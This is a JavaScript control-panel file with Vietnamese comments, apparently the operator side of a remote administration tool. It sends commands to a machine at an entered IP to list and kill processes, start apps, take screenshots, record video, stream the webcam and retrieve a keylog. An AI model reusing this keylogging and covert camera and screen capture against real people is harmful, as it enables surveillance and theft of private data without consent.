console.log("asjdkljdalksfdasf")
let IP = "";            

async function postControl(payload){
    let url = "";
    // Map command sang route server
    switch(payload.command){
        case "listApp":
            url = `http://${IP}:8080/apps`;
            break;
        case "listProcess":
            url = `http://${IP}:8080/processes`;
            break;
        case "recordVideo":
            url = `http://${IP}:8080/recordVideo?seconds=${payload.seconds}`;
            break;
        case "screenshot":
            url = `http://${IP}:8080/screenshot`;
            break;
        case "startApp":
            url = `http://${IP}:8080/startApp?name=${payload.name}`;
            break;
        case "stopProcess":
            url = `http://${IP}:8080/stopProcess?name=${payload.name}`;
            break;
        case "getKeylog":
            url = `http://${IP}:8080/getKeylog`;
            break;
        default:
            throw new Error("Unknown command");
    }

    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), 15000);

    try {
        const res = await fetch(url, { method: "GET", signal: controller.signal });
        clearTimeout(id);
        return res.text();
    } catch (e) {
        clearTimeout(id);
        throw e;
    }
}


async function postControl(payload){
    let url = "";
    if(payload.command === "listApp") url = `http://localhost:6969/apps`;
    else if(payload.command === "listProcess") url = `http://localhost:6969/processes`;
    else if(payload.command === "recordVideo") url = `http://localhost:6969/recordVideo?seconds=${payload.seconds}`;
    else if(payload.command === "screenshot") url = `http://localhost:6969/screenshot`;

    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), 15000);
    try {
        const res = await fetch(url, { method: "GET", signal: controller.signal });
        clearTimeout(id);
        return res.text();
    } catch (e) {
        clearTimeout(id);
        throw e;
    }
}


document.getElementById('btnConnect').addEventListener('click', async ()=>{
    const ip = document.getElementById('ipInput').value.trim();
    if(!ip) { showToast("Nhập IP đi bạn!", "error"); return; }
    try {
        const res = await fetch(`http://${ip}:8080/ping`);
        if(res.ok) {
            IP = ip;
            document.getElementById('connectStatus').innerHTML = `Connected: ${IP}`;
            document.getElementById('connectStatus').style.color = "#34d399";
            document.getElementById('btnConnect').style.display = 'none';
            document.getElementById('btnDisconnect').style.display = 'inline-block';
            showToast("Kết nối thành công!");
        }
    } catch(e){ showToast("Lỗi kết nối!", "error"); }
});

document.getElementById('btnDisconnect').addEventListener('click', ()=>{
    IP = "";
    document.getElementById('connectStatus').innerHTML = "Disconnected";
    document.getElementById('connectStatus').style.color = "#94a3b8";
    document.getElementById('btnConnect').style.display = 'inline-block';
    document.getElementById('btnDisconnect').style.display = 'none';
});

window.sendCommand = async function(cmd){
    // if(!IP) { showToast("Chưa kết nối!", "error"); return; }
    
    if(cmd === 'recordVideo') {
        const sec = document.getElementById('recSeconds').value;
        showToast(`🎥 Đang quay ${sec}s `, "");
        
        // 1. Gửi lệnh
        const path = await postControl({command:'recordVideo', seconds: sec});
        
        if(path.includes("Loi") || path.includes("Error")) {
            showToast(path, "error");
            document.getElementById('recordResult').innerHTML = `<div style="color:red">${path}</div>`;
        } else {
            // 2. Tạo URL (Thêm timestamp để không cache video cũ)
            const timestamp = new Date().getTime();
            const fullUrl = `http://${IP}:8080${path}?t=${timestamp}`;
            
            // 3. Tạo tên file khi tải về
            const downloadName = `Evidence_Video_${timestamp}.mp4`;

            document.getElementById('recordResult').innerHTML = `
                <div style="background:#1e293b; padding:15px; border-radius:8px; margin-top:10px; border: 1px solid #475569;">                    
                    <video controls autoplay width="100%" style="border-radius:5px; border:1px solid #334155; max-height: 300px;">
                        <source src="${fullUrl}" type="video/mp4">
                        Trình duyệt không hỗ trợ thẻ video.
                    </video>
                </div>`;
            
            showToast("Đã xong! Video đang phát.");
        }
        return;
    }
    if(cmd === 'screenshot') {
        const path = await postControl({command:'screenshot'});
        const fullUrl = `http://${IP}:8080${path}?t=${new Date().getTime()}`;
        document.getElementById('screenshotResult').innerHTML = `<img src="${fullUrl}" style="width:100%; border-radius:8px;">`;
        return;
    }

    let payload = {command: cmd};
    if(cmd === 'startApp' || cmd === 'stopProcess') {
        const val = (cmd==='startApp') ? document.getElementById('appName').value : document.getElementById('processName').value;
        payload.name = val;
    }
    const res = await postControl(payload);
    
    if(cmd === 'listApp') document.getElementById('appList').innerHTML = res;
    else if(cmd === 'listProcess') document.getElementById('processList').innerHTML= res;
    else if(cmd === 'getKeylog') document.getElementById('keylogResult').innerText = res;
    else showToast(res);
};

function startOnWebcam(){
    if(IP) document.getElementById('onWebcamContainer').innerHTML = `<img src="http://${IP}:8080/camera?t=${Date.now()}" style="width:100%">`;
}
function stopOnWebcam(){
    document.getElementById('onWebcamContainer').innerHTML = "Camera Off";
}